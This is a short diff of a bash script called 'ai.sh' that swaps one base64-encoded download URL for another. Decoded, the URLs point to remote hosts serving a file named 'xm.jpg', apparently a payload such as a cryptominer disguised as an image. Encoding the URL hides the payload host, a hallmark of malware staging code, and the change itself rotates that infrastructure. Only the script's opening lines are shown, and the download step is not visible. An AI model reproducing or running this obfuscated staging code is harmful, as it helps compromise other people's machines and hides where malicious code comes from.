@@ -1,7 +1,7 @@
 #!/bin/bash
 echo 'here is ai.sh'
 proxyport=1414
-media_url=$(echo aHR0cDovL2tpc3MuYS1kb2cudG9wL2IyZjYyOC9tL3htLmpwZwo=|base64 -d)
+media_url=$(echo aHR0cDovL3NvbHNjYW4ubGl2ZS9iMmY2MjgvbS94bS5qcGc=|base64 -d)
 check_exist()
 {
 #try other way
